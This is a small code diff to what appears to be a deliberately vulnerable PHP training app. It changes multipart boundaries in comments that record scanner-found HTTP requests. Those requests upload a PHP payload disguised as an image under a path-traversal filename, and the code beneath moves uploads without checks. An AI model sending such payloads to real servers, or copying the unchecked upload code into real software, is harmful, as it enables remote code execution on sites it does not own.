@@ -39,18 +39,18 @@
 						// Accept-Encoding: identity
 						// Connection: close
 						// Content-Length: 307
-						// Content-Type: multipart/form-data; boundary=e77d02b5db6c4bf2ba6877e0b8c80f87
+						// Content-Type: multipart/form-data; boundary=3099bcc2c3d74911b32163700f888899
 						//
-						// --e77d02b5db6c4bf2ba6877e0b8c80f87
+						// --3099bcc2c3d74911b32163700f888899
 						// Content-Disposition: form-data; name="upload"
 						//
 						// 935137890000
-						// --e77d02b5db6c4bf2ba6877e0b8c80f87
+						// --3099bcc2c3d74911b32163700f888899
 						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
 						// Content-Type: image/png
 						//
 						// <?php phpinfo(); ?>
-						// --e77d02b5db6c4bf2ba6877e0b8c80f87--
+						// --3099bcc2c3d74911b32163700f888899--
 						//
 						// TODO: AI issue #9, High, Unrestricted File Upload, https://github.com/rbm1718/bricks/issues/9
 						//
@@ -59,18 +59,18 @@
 						// Accept-Encoding: identity
 						// Connection: close
 						// Content-Length: 308
-						// Content-Type: multipart/form-data; boundary=06e135bc0bec479c911ec32f2f8e0691
+						// Content-Type: multipart/form-data; boundary=fee827b5cb67442b866cf5abcc676542
 						//
-						// --06e135bc0bec479c911ec32f2f8e0691
+						// --fee827b5cb67442b866cf5abcc676542
 						// Content-Disposition: form-data; name="upload"
 						//
 						// 935137890000
-						// --06e135bc0bec479c911ec32f2f8e0691
+						// --fee827b5cb67442b866cf5abcc676542
 						// Content-Disposition: form-data; name="userfile"; filename="../../../../../../../../../../tmp/"
 						// Content-Type: image/jpeg
 						//
 						// <?php phpinfo(); ?>
-						// --06e135bc0bec479c911ec32f2f8e0691--
+						// --fee827b5cb67442b866cf5abcc676542--
 						//
 						if (move_uploaded_file($_FILES['userfile']['tmp_name'],$destination)) {
 							echo "<div class=\"alert-box success\">Upload succesful: <a href='$destination'>here</a><a href=\"\" class=\"close\">&times;</a></div>";
